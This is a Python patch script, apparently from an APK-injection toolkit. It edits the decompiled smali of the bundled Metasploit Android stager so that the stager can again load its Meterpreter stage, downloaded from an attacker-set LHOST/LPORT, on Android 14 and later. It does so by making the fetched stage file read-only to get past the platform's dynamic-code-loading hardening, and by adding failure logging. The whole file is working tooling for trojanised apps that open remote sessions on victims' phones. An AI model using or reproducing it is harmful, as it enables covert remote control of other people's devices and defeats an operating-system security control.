#!/usr/bin/env python
"""Patch the bundled Metasploit stager so it works on Android 14+.

Why this exists
---------------
``libs/MsfDexDir/classes.dex`` is the stager that every injected APK carries.
After the handler sends the stage, the stager does this:

    File stage = new File(filesDir, "<random>.jar");   // writable file
    ... write stage bytes ...
    new DexClassLoader(stage, ...)                     // load the code

Android 14 (API 34) hardened dynamic code loading: an app that targets API 34+
may only load dex/jar code from a file that is **not writable**. The stager
writes a writable file and the JVM refuses to load it. The stager swallows the
exception unless the DEBUG flag is set in the payload config, so the only
symptom is the one Metasploit shows:

    [*] Sending stage (75365 bytes) to 10.x.x.x
    [-] Meterpreter session N is not valid and will be closed
    [*] 10.x.x.x - Meterpreter session N closed.  Reason: Died

This script applies two edits to the stager smali:

1. ``Payload.a(DataInputStream, OutputStream, Object[])`` -- call
   ``File.setReadOnly()`` on the extracted stage file right before the
   ``DexClassLoader`` is created, so ART accepts it on Android 14/15/16/17.
2. The ``:catch_e8`` handler of ``Payload.main`` -- always log the throwable to
   logcat under the tag ``apkhook`` instead of only printing it when the DEBUG
   flag is configured.

Usage
-----
    java -jar libs/jar/baksmali.jar d libs/MsfDexDir/classes.dex -o /tmp/msf_smali
    python tools/patch_stager.py /tmp/msf_smali
    java -jar libs/jar/smali.jar a /tmp/msf_smali -o libs/MsfDexDir/classes.dex

The script is idempotent: running it twice prints "already patched" and changes
nothing. Keep the config marker (``\\xde\\xad\\xba\\xad`` + 8191 zero bytes) --
``utils/CreateMsfDex.py`` needs it to write LHOST/LPORT into the dex.
"""
import argparse
import io
import os
import sys

LOADER_OLD = (
    ".method private static a(Ljava/io/DataInputStream;Ljava/io/OutputStream;[Ljava/lang/Object;)V\n"
    "    .registers 14\n"
)
LOADER_NEW = (
    ".method private static a(Ljava/io/DataInputStream;Ljava/io/OutputStream;[Ljava/lang/Object;)V\n"
    "    .registers 15\n"
)

WRITE_OLD = (
    "    invoke-virtual {v6}, Ljava/io/FileOutputStream;->close()V\n"
    "\n"
    "    new-instance v4, Ldalvik/system/DexClassLoader;\n"
)
WRITE_NEW = (
    "    invoke-virtual {v6}, Ljava/io/FileOutputStream;->close()V\n"
    "\n"
    "    # apkhook: Android 14+ refuses to load code from a writable file\n"
    "    invoke-virtual {v5}, Ljava/io/File;->setReadOnly()Z\n"
    "\n"
    "    move-result v11\n"
    "\n"
    "    const-string v11, \"apkhook\"\n"
    "\n"
    "    const-string v4, \"stager: stage saved read-only\"\n"
    "\n"
    "    invoke-static {v11, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I\n"
    "\n"
    "    new-instance v4, Ldalvik/system/DexClassLoader;\n"
)

CATCH_OLD = "    :catch_e8\n    move-exception v0\n"
CATCH_NEW = (
    "    :catch_e8\n"
    "    move-exception v0\n"
    "\n"
    "    const-string v12, \"apkhook\"\n"
    "\n"
    "    const-string v13, \"stager: stage load or exec failed\"\n"
    "\n"
    "    invoke-static {v12, v13, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I\n"
)

MARKERS = ("setReadOnly()Z", "stage saved read-only", "stage load or exec failed")


def patch(path, dry_run=False):
    with io.open(path, "r", encoding="utf-8") as fh:
        src = fh.read()
    orig = src
    notes = []

    if "setReadOnly()Z" in src:
        notes.append("read-only guard: already patched")
    elif src.count(WRITE_OLD) == 1:
        src = src.replace(WRITE_OLD, WRITE_NEW, 1)
        notes.append("read-only guard: applied")
    else:
        raise SystemExit("[x] read-only anchor not found (%d matches)" % src.count(WRITE_OLD))

    if "stage saved read-only" not in src and LOADER_OLD not in src:
        notes.append("registers: already widened")
    elif src.count(LOADER_OLD) == 1:
        src = src.replace(LOADER_OLD, LOADER_NEW, 1)
        notes.append("registers: widened to 15")
    else:
        raise SystemExit("[x] loader anchor not found (%d matches)" % src.count(LOADER_OLD))

    if "stage load or exec failed" in src:
        notes.append("catch logging: already patched")
    elif src.count(CATCH_OLD) == 1:
        src = src.replace(CATCH_OLD, CATCH_NEW, 1)
        notes.append("catch logging: applied")
    else:
        raise SystemExit("[x] catch anchor not found (%d matches)" % src.count(CATCH_OLD))

    if not dry_run and src != orig:
        with io.open(path, "w", encoding="utf-8", newline="\n") as fh:
            fh.write(src)

    for name in MARKERS:
        notes.append("marker %-28s %s" % (name, "ok" if name in src else "MISSING"))
    return notes


def main():
    ap = argparse.ArgumentParser(description="Patch the bundled msf stager for Android 14+")
    ap.add_argument("smali_dir", help="directory produced by baksmali d (contains com/metasploit/stage)")
    ap.add_argument("--dry-run", action="store_true", help="report only, do not write")
    args = ap.parse_args()

    path = os.path.join(args.smali_dir, "com", "metasploit", "stage", "Payload.smali")
    if not os.path.isfile(path):
        raise SystemExit("[x] not found: %s" % path)

    for line in patch(path, args.dry_run):
        print("[+] " + line)
    print("[+] done: %s" % path)
    return 0


if __name__ == "__main__":
    sys.exit(main())
